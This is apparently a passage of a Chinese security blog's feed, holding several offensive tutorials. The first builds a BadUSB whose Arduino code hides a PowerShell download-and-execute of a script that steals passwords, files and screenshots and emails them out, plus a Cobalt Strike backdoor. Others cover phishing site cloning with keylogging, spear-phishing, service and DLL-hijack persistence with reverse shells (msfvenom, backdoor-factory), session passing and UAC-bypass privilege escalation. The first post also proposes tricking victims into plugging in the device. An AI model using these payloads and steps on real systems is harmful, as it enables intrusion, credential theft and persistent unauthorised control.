alt="eACsw6.png"></a><br>一路Next下来，本处选择刚刚解压的ardunio1.64路径才可以正常安装<br><a href="https://imgchr.com/i/eACWSH"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451046.png" alt="eACWSH.png"></a><br>选择all进行安装<br><a href="https://imgchr.com/i/eACcFO"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451875.png" alt="eACcFO.png"></a></p><p>4.开启smtp服务<br>为确保我们的脚本能够完美地发送包含目标主机信息的邮件，我们需要开启smtp邮箱服务。本处我使用的是QQ邮箱，开启方法如下：<br>进入邮箱，点击设置-账户<br><a href="https://imgchr.com/i/eACgYD"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452562.png" alt="eACgYD.png"></a></p><p>向下拉即可看到<br><a href="https://imgchr.com/i/eAC2fe"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452333.png" alt="eAC2fe.png"></a><br>将头两个服务开启，此过程需要验证密保~<br>即可获得“授权码”（即后文提到的邮箱密码）此处的邮箱密码并不是指QQ密码<br><a href="https://imgchr.com/i/eACfld"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453721.png" alt="eACfld.png"></a></p><p>5.服务器端准备<br>①首先下载Badusb所需代码，代码已打包，见文末<br>②修改压缩包中的main.ps1的2754行，把打码的地方改为自己的服务器IP<br><a href="https://imgchr.com/i/eACQQs"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453507.png" alt="eACQQs.png"></a></p><p>③修改main.ps1的2903-2919行 为发送邮件配置<br><a href="https://imgchr.com/i/eACKzj"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453845.png" alt="eACKzj.png"></a></p><p>④修改GetPass.ps1中的前两行，域名，Getpass.rar实际上是lazagne，用rar下载尽量避免出发安全软件，这个不放心可以百度下载。command.rar实为bat 因为 lazagne注入lsass时会被安全软件拦截，所以用bat避免注入。修改GetPass.ps1中的邮箱配置，同main.ps1中的就行<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453746.png" alt="eAi9KA.png"><br>⑤将修改后的全部文件用HFS（一个简单的提供http下载软件）上传到公网服务器<br>HFS链接：<a href="http://www.ouyaoxiazai.com/soft/stgj/133/21762.html">http://www.ouyaoxiazai.com/soft/stgj/133/21762.html</a><br><a href="https://imgchr.com/i/eACFsI"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453712.png" alt="eACFsI.png"></a></p><h2 id="0x03-Badusb制作"><a href="#0x03-Badusb制作" class="headerlink" title="0x03-Badusb制作"></a>0x03-Badusb制作</h2><p>1.将硬件插入电脑<br><a href="https://imgchr.com/i/eACCzd"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453770.png" alt="eACCzd.png"></a></p><p>2.打开Arduino IDE<br>3.工具-&gt;版-&gt;选择“Arduino Leonardo”<br><a href="https://imgchr.com/i/eACiQA"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453681.png" alt="eACiQA.png"></a></p><p>4.输入Windows +R 输入命令devmgmt.msc打开设备管理器<br>查看串口信息<br><a href="https://imgchr.com/i/eACVdf"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453575.png" alt="eACVdf.png"></a><br>5.根据之前的串口信息，打开ardunio ide选择–工具-&gt;端口-&gt;选择“COM* (Arduino Leonardo)”<br>6.现在可以看到IDE右下角出现“Arduino Leonardo on COM*”<br><a href="https://imgchr.com/i/eACkLt"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453630.png" alt="eACkLt.png"></a><br>6.下面进行将代码写入硬件的操作<br>①复制如下代码到ardunio中</p><pre><code>void setup()&#123;//初始化 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500);Keyboard.press(&#39;r&#39;);//r键delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/main.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//结束键盘通讯 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500);Keyboard.press(&#39;r&#39;);//r键delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/payload.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//结束键盘通讯 &#125;void loop() &#123;&#125;</code></pre><p>请各位将8.8.8.8改成自己的服务器ip~<br>注释写的应该都很明白了，小伙伴们可以根据自己的需求修改</p><p>PS:我这边选择执行两个payload，第一个是我之前教大家修改上传的main.ps1，这个脚本实现的是“截图、用户凭据导出，文件窃取，计算机中浏览器&#x2F;WIFI等密码的读取”并将其通过邮箱发送到我们手中。</p><p>第二个Payload是我在cobaltstrike里面生成的powershell一句话后门<br><a href="https://imgchr.com/i/eACEeP"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454216.png" alt="eACEeP.png"></a></p><p>代码大体的意思是：<br>插入BADusb后等待五秒，<br>切换大写绕开输入法<br>按下Windows+R打开cmd<br>模拟输入一个字符串，并回车执行</p><p>当你将代码写入完成后，恭喜你，Badusb已制作成功<br><a href="https://imgchr.com/i/eACZo8"><img src="https://s2.ax1x.com/2019/07/23/eACZo8.png" alt="eACZo8.png"></a></p><h2 id="0x004测试"><a href="#0x004测试" class="headerlink" title="0x004测试"></a>0x004测试</h2><p>将Badusb插入电脑，短暂几秒延时后，发现打开了cmd窗口，输入了我们下载执行powershell的命令，并回车执行<br><a href="https://imgchr.com/i/eACnJg"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454260.png" alt="eACnJg.png"></a><br>过了几分钟，会来两封邮件<br><a href="https://imgchr.com/i/eACmFS"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454768.png" alt="eACmFS.png"></a><br><a href="https://imgchr.com/i/eAiHzQ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454150.png" alt="eAiHzQ.png"></a><br>这里面便是我们心心念念的Badusb执行结果<br>Report.zip内容如图<br><a href="https://imgchr.com/i/eAiLss"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454104.png" alt="eAiLss.png"></a></p><p>Getpass txt内容如下</p><pre><code>|==========================                                                                       |                                                                |                        The LaZagne Project                       |                                                                   |                                                                   |==========================########## User: Administrator ##########------------------- Chrome passwords -----------------Password found !!!URL: http://127.0.0.1/loginLogin: adminPassword: xunfeng321Password found !!!URL: http://10.97.3.177:8080/cgi-bin/login.htmlLogin: adminPassword: admin..........内容太多，省略了</code></pre><p>Cobaltstrike也收到了会话（我插了好几次）<br><a href="https://imgchr.com/i/eAClyn"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454731.png" alt="eAClyn.png"></a></p><h2 id="0x005攻击场景"><a href="#0x005攻击场景" class="headerlink" title="0x005攻击场景"></a>0x005攻击场景</h2><p>①社工攻击<br>  小姐姐，我的U盘插我的电脑显示不出来，你能帮我看看你的电脑可以吗？<br>  <a href="https://imgchr.com/i/eACGwV"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455578.png" alt="eACGwV.png"></a><br>②带有USB接口的终端机<br><a href="https://imgchr.com/i/eACJoT"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455649.png" alt="eACJoT.png"></a><br>找到USB接口怼进去，插谁谁怀孕<br>其他应用场景自行脑补，欢迎评论分享</p><h2 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h2><p>   今天介绍了硬件设备Badusb的制作及使用，大家可以修改服务器端的powershell代码来实现更多的功能，欢迎评论分享自己的思路<br>本篇文章耗时7小时，也算是自己写过比较长的啦。<br><a href="https://imgchr.com/i/eAC1Lq"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455674.png" alt="eAC1Lq.png"></a></p><h2 id="0x006-Badusb代码下载"><a href="#0x006-Badusb代码下载" class="headerlink" title="0x006 Badusb代码下载"></a>0x006 Badusb代码下载</h2><p>链接：<a href="https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg">https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg</a><br>提取码：zisl</p>]]></content>
      
      
      <categories>
          
          <category> 硬件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十四)网站克隆与邮件鱼叉钓鱼</title>
      <link href="/2019/06/21/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E5%9B%9B-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E4%B8%8E%E9%82%AE%E4%BB%B6%E9%B1%BC%E5%8F%89%E9%92%93%E9%B1%BC/"/>
      <url>/2019/06/21/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E5%9B%9B-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E4%B8%8E%E9%82%AE%E4%BB%B6%E9%B1%BC%E5%8F%89%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>亲们，这篇是cobaltstrike系列教程的最后一篇啦~写这套教程，我足足写了一个周，还是非常疲惫的，但是想到大家可以从中收获一些东西，便又充满了力量。</p><p>这个浮躁的时代，很少有人会静下心来学习与分享，我也是浮躁的一员，但也想为这个圈子留下点东西，因此决定平时多写一些文章供大家阅读。</p><h2 id="0x02-网站克隆"><a href="#0x02-网站克隆" class="headerlink" title="0x02-网站克隆"></a>0x02-网站克隆</h2><p>菜单栏，攻击–&gt;钓鱼攻击–&gt;克隆网站<br><a href="https://imgchr.com/i/e8rLxP"><img src="https://s2.ax1x.com/2019/07/29/e8rLxP.png" alt="e8rLxP.png"></a><br>根据你的个人需求，填写克隆网址，主机地址，和你的端口，注意端口不要冲突<br>记得把键盘记录打开<br><a href="https://imgchr.com/i/e8roUH"><img src="https://s2.ax1x.com/2019/07/29/e8roUH.png" alt="e8roUH.png"></a><br>如图，我们成功克隆出一个百度<br><a href="https://imgchr.com/i/e8rHPA"><img src="https://s2.ax1x.com/2019/07/29/e8rHPA.png" alt="e8rHPA.png"></a></p><p>随后我们在，视图–&gt;web日志中查看相关信息<br><a href="https://imgchr.com/i/e8rIVe"><img src="https://s2.ax1x.com/2019/07/29/e8rIVe.png" alt="e8rIVe.png"></a><br>如图，一位不知名的用户在该页面输入了J0o1ey dashuaibi<br><a href="https://imgchr.com/i/e8rb8I"><img src="https://s2.ax1x.com/2019/07/29/e8rb8I.png" alt="e8rb8I.png"></a></p><h2 id="0x03-邮件鱼叉钓鱼"><a href="#0x03-邮件鱼叉钓鱼" class="headerlink" title="0x03-邮件鱼叉钓鱼"></a>0x03-邮件鱼叉钓鱼</h2><p>使用 攻击–&gt;邮件钓鱼</p><pre><code>targets 发送的目标信息 格式 xxxx@xxx.com(tab键) name55x@qq.com        TOMxx@163.com        jimtmplate 邮件模板 一般在邮件的更多选项中 ，选择导出，或者显示原文attachment 附件Embed URL 要嵌入的网址Mail server SMTPBounce to 模仿发件人preview 预览我们的模板文件 </code></pre><p><a href="https://imgchr.com/i/e8rq2t"><img src="https://s2.ax1x.com/2019/07/29/e8rq2t.png" alt="e8rq2t.png"></a><br>send发送成功后我们可以在 send email 看到提示</p><p>这个功能不推荐大家使用，发出去的邮件泼出去的水，很容易被取证的，自己娱乐玩下就好</p><p><a href="https://imgchr.com/i/e8rjr8"><img src="https://s2.ax1x.com/2019/07/29/e8rjr8.png" alt="e8rjr8.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十三)控制持久化</title>
      <link href="/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%89-%E6%8E%A7%E5%88%B6%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%89-%E6%8E%A7%E5%88%B6%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-右键菜单实现控制持久化"><a href="#0x01-右键菜单实现控制持久化" class="headerlink" title="0x01-右键菜单实现控制持久化"></a>0x01-右键菜单实现控制持久化</h2><p>在windows中，拿到目标主机权限后，，维持权限是必不可少的工作。<br>目前常见的手法有:</p><pre><code>1.注册表2.启动项3.计时任务4.设置服务5.shift后门6.dll劫持(白加黑)7.利用其他安装的软件</code></pre><p>在我之前给出的插件中，已经包含了控制持久化的插件<br>如图，里面包含了很多控制持久化的方法，可自动执行<br><a href="https://imgchr.com/i/e8U66e"><img src="https://s2.ax1x.com/2019/07/29/e8U66e.png" alt="e8U66e.png"></a></p><p>前几个Persist(※)貌似都是劫持关键程序的dll实现控制持久化</p><p>Sticky Keys是大家熟悉的粘滞键后门(shift后门，摁五下shift弹出cmd窗口)</p><p>Scheduled Job方法为写计划任务维持权限</p><p>利用这个菜单实现控制持久化虽然方便，但是存在一定的局限，也有很多问题，下面简单讲两种个人常用的维持权限的方法</p><h2 id="0x02-Windows-Service维持权限"><a href="#0x02-Windows-Service维持权限" class="headerlink" title="0x02-Windows Service维持权限"></a>0x02-Windows Service维持权限</h2><p>在cobaltstrike中生成一个Windows service服务后门<br><a href="https://imgchr.com/i/e8UWTI"><img src="https://s2.ax1x.com/2019/07/29/e8UWTI.png" alt="e8UWTI.png"></a></p><p>导出时后门名为beacon.exe<br><a href="https://imgchr.com/i/e8UylD"><img src="https://s2.ax1x.com/2019/07/29/e8UylD.png" alt="e8UylD.png"></a><br>随后在beacon中执行如下命令</p><pre><code>beacon&gt; cd C:\WINDOWS\Temp\[] cd C:\WINDOWS\Temp\[+] host called home, sent: 24 bytes beacon&gt; upload /root/beacon.exe[] Tasked beacon to upload /root/beacon.exe as beacon.exe[+] host called home, sent: 309782 bytesbeacon&gt; shell sc create &quot;thisisserver&quot; binpath= &quot;C:\WINDOWS\Temp\beacon.exe&quot;[] Tasked beacon to run: sc create &quot;thisisserver&quot; binpath= &quot;C:\WINDOWS\Temp\beacon.exe&quot;[+] host called home, sent: 93 bytes[+] received output:[SC] CreateService 成功beacon&gt; shell sc description &quot;thisisserver&quot; &quot;description&quot;[] Tasked beacon to run: sc description &quot;thisisserver&quot; &quot;description&quot;[+] host called home, sent: 74 bytes[+] received output:[SC] ChangeServiceConfig2 成功beacon&gt; shell sc config &quot;thisisserver&quot; start= auto[] Tasked beacon to run: sc config &quot;thisisserver&quot; start= auto[+] host called home, sent: 67 bytes[+] received output:[SC] ChangeServiceConfig 成功beacon&gt; shell net start &quot;thisisserver&quot;[] Tasked beacon to run: net start &quot;thisisserver&quot;[+] host called home, sent: 55 bytes*</code></pre><p>这样的话目标机每次开机，都会运行你的beacon.exe后门，实现控制的持久化。<br>当然，如果目标主机存在杀毒全家桶的话，那么对你后门的免杀是有很高要求的，至于cobaltstrike后门的免杀，打算过一段时间做个番外篇讲，老铁们可以关注下~</p><h2 id="0x03-dll劫持-白加黑-维持权限"><a href="#0x03-dll劫持-白加黑-维持权限" class="headerlink" title="0x03-dll劫持(白加黑)维持权限"></a>0x03-dll劫持(白加黑)维持权限</h2><p>Dll劫持的话，主要是劫持那些经常运行程序的dll，这样程序一运行，就会加载我们的恶意dll。实现控制持久化</p><h3 id="我们来看一个例子，劫持微信的dll"><a href="#我们来看一个例子，劫持微信的dll" class="headerlink" title="我们来看一个例子，劫持微信的dll"></a>我们来看一个例子，劫持微信的dll</h3><p>首先使用Process Explore查看微信调用的文件<br><a href="https://imgchr.com/i/e8U0Fx"><img src="https://s2.ax1x.com/2019/07/29/e8U0Fx.png" alt="e8U0Fx.png"></a></p><p>本次测试，是劫持的他的d3dcompiler_47.dll<br>使用backdoor factory制作dll后门(保存在目录的backdoored文件夹下)<br>链接:<a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br>命令如下</p><pre><code>python backdoor.py -f d3dcompiler_47.dll -s reverse_shell_tcp_inline -P 6666 -H 8.8.8.8(你的teamserver)</code></pre><p><a href="https://imgchr.com/i/e8UtOJ"><img src="https://s2.ax1x.com/2019/07/29/e8UtOJ.png" alt="e8UtOJ.png"></a><br>把这个加了后门的dll放到微信程序的文件夹下<br>用cobaltstrike配置一个tcp协议监听6666端口的Listener，或者nc监听6666端口，目标机运行微信时，即可收到反弹的shell</p><h3 id="再看一个，劫持notepad的dll："><a href="#再看一个，劫持notepad的dll：" class="headerlink" title="再看一个，劫持notepad的dll："></a>再看一个，劫持notepad的dll：</h3><p>我们首先打开Kali，用Metasploit或者cobaltstrike来生成一个dll木马<br>Metasploit生成dll后门命令</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.199.107 lport=6666 -f dll &gt; ./Msimg32.dll</code></pre><p>Cobaltstrike生成dll后门方法<br><a href="https://imgchr.com/i/e8UR0A"><img src="https://s2.ax1x.com/2019/07/29/e8UR0A.png" alt="e8UR0A.png"></a></p><p>然后配置6666端口的监听<br>Metasploit:</p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.199.107set lport 6666exploit</code></pre><p>Cobaltstrike:<br>请看教程第二节</p><p>然后我们把dll放到notepad文件夹中，运行notpad++，即可返回会话。</p><p><a href="https://imgchr.com/i/e8UsSO"><img src="https://s2.ax1x.com/2019/07/29/e8UsSO.png" alt="e8UsSO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十二)CS与MSF,Armitage,Empire会话互转</title>
      <link href="/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%BA%8C-CS%E4%B8%8EMSF-Armitage-Empire%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC/"/>
      <url>/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%BA%8C-CS%E4%B8%8EMSF-Armitage-Empire%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrike与MSF会话互转"><a href="#0x01-Cobaltstrike与MSF会话互转" class="headerlink" title="0x01-Cobaltstrike与MSF会话互转"></a>0x01-Cobaltstrike与MSF会话互转</h2><h3 id="①Metasploit派生shell给Cobaltstrike"><a href="#①Metasploit派生shell给Cobaltstrike" class="headerlink" title="①Metasploit派生shell给Cobaltstrike"></a>①Metasploit派生shell给Cobaltstrike</h3><p>首先，你需要拿到一个metepreter会话，本例中session为1<br>Cobaltstrike的teamserver的ip为8.8.8.8，http监听器端口为4555</p><pre><code>msf exploit(handler) &gt;  use exploit/windows/local/payload_injectmsf exploit(payload_inject) &gt;  set PAYLOAD windows/meterpreter/reverse_httpmsf exploit(payload_inject) &gt; set DisablePayloadHandler truemsf exploit(payload_inject) &gt; set LHOST 8.8.8.8.msf exploit(payload_inject) &gt; set LPORT 4555msf exploit(payload_inject) &gt; set SESSION 1msf exploit(payload_inject) &gt; exploit</code></pre><p>如图Cobaltstrike成功上线<br><a href="https://imgchr.com/i/e8Qn4H"><img src="https://s2.ax1x.com/2019/07/29/e8Qn4H.png" alt="e8Qn4H.png"></a></p><h3 id="②Cobalt-strike-派生-shell-给-MSF-前提有个beacon-shell"><a href="#②Cobalt-strike-派生-shell-给-MSF-前提有个beacon-shell" class="headerlink" title="②Cobalt strike 派生 shell 给 MSF(前提有个beacon shell)"></a>②Cobalt strike 派生 shell 给 MSF(前提有个beacon shell)</h3><pre><code>msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 8.8.8.8lhost =&gt; 8.8.8.8msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit</code></pre><p>然后在cobaltstrike中创建一个windows&#x2F;foreign&#x2F;reverse_tcp Listener<br>，并根据metasploit监听配置cobaltstrike的listener<br><a href="https://imgchr.com/i/e8QVHO"><img src="https://s2.ax1x.com/2019/07/29/e8QVHO.png" alt="e8QVHO.png"></a></p><p>选择要派生的beacon，右键–&gt;增加会话，选择刚刚配置的foreign监听器<br><a href="https://imgchr.com/i/e8QEDK"><img src="https://s2.ax1x.com/2019/07/29/e8QEDK.png" alt="e8QEDK.png"></a></p><p>MSF即可成功收到会话<br><a href="https://imgchr.com/i/e8QAu6"><img src="https://s2.ax1x.com/2019/07/29/e8QAu6.png" alt="e8QAu6.png"></a></p><h2 id="0x02-Cobaltstrike与Armitage会话互转"><a href="#0x02-Cobaltstrike与Armitage会话互转" class="headerlink" title="0x02-Cobaltstrike与Armitage会话互转"></a>0x02-Cobaltstrike与Armitage会话互转</h2><h3 id="①Cobaltstrike派生shell给Armitage"><a href="#①Cobaltstrike派生shell给Armitage" class="headerlink" title="①Cobaltstrike派生shell给Armitage"></a>①Cobaltstrike派生shell给Armitage</h3><p>首先在armitage中配置一个handler，注意：payload要与cobaltstrike的foreign监听器的协议相同，不然收不到会话。<br><a href="https://imgchr.com/i/e8Qlvt"><img src="https://s2.ax1x.com/2019/07/29/e8Qlvt.png" alt="e8Qlvt.png"></a><br>同样使用刚刚讲过的cobaltstrike派生会话功能，armitage即可收到shell<br><a href="https://imgchr.com/i/e8Q3KP"><img src="https://s2.ax1x.com/2019/07/29/e8Q3KP.png" alt="e8Q3KP.png"></a></p><h3 id="Armitage派生shell给cobaltstrike"><a href="#Armitage派生shell给cobaltstrike" class="headerlink" title="Armitage派生shell给cobaltstrike"></a>Armitage派生shell给cobaltstrike</h3><p>选择armitage中的会话，右键，Access–&gt;Pss Session<br><a href="https://imgchr.com/i/e8QeED"><img src="https://s2.ax1x.com/2019/07/29/e8QeED.png" alt="e8QeED.png"></a><br>随后配置相关信息为cobaltstrike http监听器的ip和端口<br><a href="https://imgchr.com/i/e8QmUe"><img src="https://s2.ax1x.com/2019/07/29/e8QmUe.png" alt="e8QmUe.png"></a><br>Cobaltstrike即可收到会话</p><h2 id="0x003-Cobaltstrike与Empire会话互转"><a href="#0x003-Cobaltstrike与Empire会话互转" class="headerlink" title="0x003-Cobaltstrike与Empire会话互转"></a>0x003-Cobaltstrike与Empire会话互转</h2><p>首先如图，在empire中配置好相关的http协议监听器<br><a href="https://imgchr.com/i/e8QKCd"><img src="https://s2.ax1x.com/2019/07/29/e8QKCd.png" alt="e8QKCd.png"></a><br>在cobaltstrike里面添加一个foreign监听器，协议为http<br><a href="https://imgchr.com/i/e8QM8A"><img src="https://s2.ax1x.com/2019/07/29/e8QM8A.png" alt="e8QM8A.png"></a><br>随后使用cobaltstrike中讲过的“增加会话”功能，选择该http监听器，empire即可成功收到会话。</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十一)提权与横向移动</title>
      <link href="/2019/06/17/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%80-%E6%8F%90%E6%9D%83%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2019/06/17/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%80-%E6%8F%90%E6%9D%83%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x001-提权"><a href="#0x001-提权" class="headerlink" title="0x001-提权"></a>0x001-提权</h2><h3 id="1-右键菜单提权"><a href="#1-右键菜单提权" class="headerlink" title="1.右键菜单提权:"></a>1.右键菜单提权:</h3><p>选择beacon，右键，执行–&gt;提权<br><img src="https://s2.ax1x.com/2019/07/29/e1wAFP.png" alt="e1wAFP.png"><br>我由于加载了插件，所以比官方多了几种提权方式<br>插件下载请看我之前的帖子<br><a href="https://imgchr.com/i/e1dbZR"><img src="https://s2.ax1x.com/2019/07/29/e1dbZR.png" alt="e1dbZR.png"></a></p><h3 id="ms14-058-x2F-ms15-051-x2F-ms16-016-x2F-ms16-032"><a href="#ms14-058-x2F-ms15-051-x2F-ms16-016-x2F-ms16-032" class="headerlink" title="ms14-058&#x2F;ms15-051&#x2F;ms16-016&#x2F;ms16-032"></a>ms14-058&#x2F;ms15-051&#x2F;ms16-016&#x2F;ms16-032</h3><p>这些都是大家耳熟能详的Windows本地提权漏洞，在此插件中都已经集成</p><h3 id="UAC-DLL"><a href="#UAC-DLL" class="headerlink" title="UAC-DLL"></a>UAC-DLL</h3><p>这是一种绕过UAC的攻击，它试图将本地管理员运行的有效负载从低权限提升到高权限。此攻击使用UAC漏洞将ArtifactKit生成的DLL复制到特权位置。此攻击适用于Windows7和Windows8及更高版本的未修补版本。</p><h3 id="uac-token-duplication"><a href="#uac-token-duplication" class="headerlink" title="uac-token-duplication"></a>uac-token-duplication</h3><p>这是另一种绕过UAC的攻击，将其从低权限提升到高权限（作为本地管理员）。这种攻击使用一个UAC漏洞，允许非提升进程使用从提升进程中窃取的令牌启动任意进程。此漏洞要求攻击删除分配给提升令牌的多个权限。此攻击适用于Windows7及更高版本。如果AlwaysNotify处于其最高设置，则此攻击要求提升的进程已在当前桌面会话中运行（作为同一用户）,此漏洞使用PowerShell生成会话。</p><h3 id="Uac-eventvwr"><a href="#Uac-eventvwr" class="headerlink" title="Uac-eventvwr"></a>Uac-eventvwr</h3><p>这种提权方法是利用时间查看器eventvwr，通过注册表之后，执行Eventvwr.exe会自动加载我们的A.exe(exp),这个时候他的权限就是高了，成功绕过UAV<br><a href="https://imgchr.com/i/e1dLIx"><img src="https://s2.ax1x.com/2019/07/29/e1dLIx.png" alt="e1dLIx.png"></a></p><h3 id="Uac-wscript"><a href="#Uac-wscript" class="headerlink" title="Uac-wscript"></a>Uac-wscript</h3><p>这种绕过uac提权的方法最初是在Empire框架中现身的，该方法只针对Windows7有效</p><h3 id="2-自用EXP提权"><a href="#2-自用EXP提权" class="headerlink" title="2.自用EXP提权"></a>2.自用EXP提权</h3><p>这种方式就是比较常规的方法，自己上传最新的EXP进行提权，至于文件上传和执行的方法，之前已经讲过，在此不多赘述<br>最近测试CVE-2019-0803的提权效果不错，影响版本非常广</p><pre><code>Microsoft Windows Server 2019 0Microsoft Windows Server 2016 0Microsoft Windows Server 2012 R2 0Microsoft Windows Server 2012 0Microsoft Windows Server 2008 R2 for x64-based Systems SP1Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1Microsoft Windows Server 2008 for x64-based Systems SP2Microsoft Windows Server 2008 for Itanium-based Systems SP2Microsoft Windows Server 2008 for 32-bit Systems SP2Microsoft Windows Server 1803 0Microsoft Windows Server 1709 0Microsoft Windows RT 8.1Microsoft Windows 8.1 for x64-based Systems 0Microsoft Windows 8.1 for 32-bit Systems 0Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 7 for 32-bit Systems SP1Microsoft Windows 10 Version 1809 for x64-based Systems 0Microsoft Windows 10 Version 1809 for ARM64-based Systems 0Microsoft Windows 10 Version 1809 for 32-bit Systems 0Microsoft Windows 10 Version 1803 for x64-based Systems 0Microsoft Windows 10 Version 1803 for ARM64-based Systems 0Microsoft Windows 10 Version 1803 for 32-bit Systems 0Microsoft Windows 10 version 1709 for x64-based Systems 0Microsoft Windows 10 Version 1709 for ARM64-based Systems 0Microsoft Windows 10 version 1709 for 32-bit Systems 0Microsoft Windows 10 version 1703 for x64-based Systems 0Microsoft Windows 10 version 1703 for 32-bit Systems 0Microsoft Windows 10 Version 1607 for x64-based Systems 0Microsoft Windows 10 Version 1607 for 32-bit Systems 0Microsoft Windows 10 for x64-based Systems 0Microsoft Windows 10 for 32-bit Systems 0</code></pre><p>EXP的下载链接为:<a 